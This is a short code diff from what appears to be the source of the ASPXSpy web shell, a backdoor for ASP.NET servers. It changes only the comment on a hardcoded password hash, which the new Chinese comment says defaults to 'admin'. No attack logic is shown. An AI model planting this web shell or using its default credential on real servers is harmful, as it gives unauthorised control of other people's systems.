@@ -27,7 +27,7 @@ Make in China
 Blog: http://www.rootkit.net.cn
 E-mail : master@rootkit.net.cn
 */
-public string Password="21232f297a57a5a743894a0e4a801fc3";//admin
+public string Password="21232f297a57a5a743894a0e4a801fc3";//密码为32位MD5加密(小写) 默认为：admin
 public string vbhLn="ASPXSpy";
 public int TdgGU=1;
 protected OleDbConnection Dtdr=new OleDbConnection();
